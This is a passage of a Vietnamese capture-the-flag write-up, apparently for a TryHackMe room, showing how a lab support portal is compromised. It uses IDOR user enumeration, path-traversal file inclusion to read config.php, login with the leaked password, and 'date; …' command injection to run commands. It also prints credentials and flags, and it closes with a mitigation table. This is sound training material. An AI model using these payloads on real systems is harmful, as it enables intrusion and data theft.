→ Xuất hiện **"IT Admin Panel"** với nút **View API**.

---

## Bước 4 — IDOR trên API `/user/{id}`

API `api.php` route qua **PATH_INFO** dạng `/user/{id}`. Trước khi đổi cookie (helpdesk) nó **khóa về đúng user của mình (id=3)**; sau khi thành IT User mới liệt kê được người khác.

Enumerate user ID:

```bash
for id in $(seq 1 10); do
  echo "--- /user/$id ---"
  curl -s -b "$CK" "http://10.48.187.204/user/$id"; echo
done
```

Kết quả (đã xác minh):

```
/user/1 → { "email": "specialadmin@support.thm", "2FA": false, "admin": true  }
/user/2 → { "email": "IT@support.thm",           "2FA": false, "admin": false }
/user/3 → { "email": "help@support.thm",         "2FA": false, "admin": false }
/user/4 → null
```

> ⚠️ Phải gọi **`/user/{id}`** (path), KHÔNG phải `/api.php/user/{id}` (cái này hiển thị HTML tĩnh và bỏ qua tham số).

**Kết quả:** tìm được admin **`specialadmin@support.thm`** (admin: true).

---

## Bước 5 — Constrained LFI qua `?skin=` để đọc source

Dashboard có theme selector `?skin=default|red|green|blue`. Nó `include()` file `skins/{value}.php` không whitelist → **LFI bị giới hạn (.php)**, nhưng vẫn đọc được các file `.php` của server, **in raw source** (kể cả `<?php`).

Đọc `config.php` (chứa master password):

```bash
curl -s -b "$CK" \
  "http://10.48.187.204/dashboard.php?skin=../../../../../var/www/html/config" \
  | grep -iE 'password|MASTER|SITE'
```

Kết quả lộ source:

```php
<?php
$MASTER_PASSWORD = 'support@110';
$SITE_VER  = '1.0';
$SITE_NAME = 'support_portal';
```

**Master password = `support@110`.**

---

## Bước 6 — Login admin

Ghép email admin + password từ config. **Mẹo:** server **loại bỏ ký tự `@`** khi so sánh → password thực tế dùng là `support110` (bỏ `@`):

```bash
# dùng mật khẩu có @ (bị lỗi - ở lại login)
curl -s -L -X POST \
  --data-urlencode "email=specialadmin@support.thm" \
  --data-urlencode "password=support@110" http://10.48.187.204/ | grep -iE 'Welcome'

# ✔ đúng: bỏ @
curl -s -c admin.cookie -L -X POST \
  --data-urlencode "email=specialadmin@support.thm" \
  --data-urlencode "password=support110" http://10.48.187.204/ \
  | grep -iE 'THM|Administrator'
```

Kết quả — **FLAG 1 (admin)**:

```
🎯 Administrator Access Confirmed
THM{I_AM_ADMIN999}
```

---

## Bước 7 — Command Injection (`sys=`) → RCE

Admin dashboard có widget chọn "Date"/"Time" gửi POST tham số **`sys`** vào `shell_exec()`. Source lộ ra điều kiện: **`$sys` phải bắt đầu bằng `date`** → ta chèn sau dấu `;`.

Xác nhận RCE (chạy `id`):

```bash
curl -s -b admin.cookie -X POST \
  --data-urlencode "sys=date; id" \
  http://10.48.187.204/dashboard.php | grep -iE 'uid='
```

Kết quả:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Đọc flag user:**

```bash
curl -s -b admin.cookie -X POST \
  --data-urlencode "sys=date; cat /home/ubuntu/user.txt" \
  http://10.48.187.204/dashboard.php | grep -iE 'THM'
```

**FLAG 2 (user): `THM{GOT_THE_FLAG001}`**

*(Không có `root.txt` — user `www-data` không đủ quyền truy cập `/root`; flag user là mục tiêu cuối của room.)*

---

## Kết quả cuối

| Hạng mục | Giá trị |
|:---|:---|
| Tài khoản helpdesk | `help@support.thm` / `snoopy` |
| Cookie IT (forged) | `isITUser=b326b5062b2f0e69046810717534cb09` (= md5 "true") |
| Admin email | `specialadmin@support.thm` |
| Master password | `support@110` → dùng `support110` |
| **Flag admin** | **`THM{I_AM_ADMIN999}`** |
| **Flag user** | **`THM{GOT_THE_FLAG001}`** |

---

## Tổng hợp lỗ hổng (Mitigation tương ứng)

| # | Lỗ hổng | Bản chất | Khắc phục |
|:--|:---|:---|:---|
| 1 | No rate limiting | Brute-force được | Rate limit / account lockout / CAPTCHA |
| 2 | Cookie tamper | `isITUser` = unsigned MD5 của boolean | Dùng session server-side, sign cookie, không dùng client để quyết định quyền |
| 3 | IDOR (BOLA) | `/user/{id}` không kiểm tra quyền sở hữu | Kiểm tra authorization trước khi trả object |
| 4 | Constrained LFI | `?skin=` include không whitelist | Whitelist nghiêm ngặt giá trị skin |
| 5 | Command Injection | `sys=` nối thẳng vào `shell_exec` | Không truyền input người dùng vào shell; dùng whitelist lệnh |
| 6 | Config lộ qua LFI | `config.php` chứa password cleartext | Không nhúng secret trong source; cấu hình ngoài docroot |

</div>

---

